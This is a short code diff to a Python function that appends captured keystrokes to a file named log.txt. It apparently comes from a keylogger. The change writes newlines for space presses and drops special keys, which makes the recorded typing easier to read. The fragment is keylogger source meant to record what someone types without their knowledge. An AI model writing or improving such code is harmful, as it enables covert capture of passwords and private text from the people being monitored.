@@ -27,7 +27,10 @@ def write_file(keys):
     with open('log.txt', 'a') as f:
         for key in keys:
             k = str(key).replace("'", "")
-            f.write(str(key))
+            if k.find("space") > 0:
+                f.write('\n')
+            elif k.find("Key") == -1:
+                f.write(str(key))
 
 
 
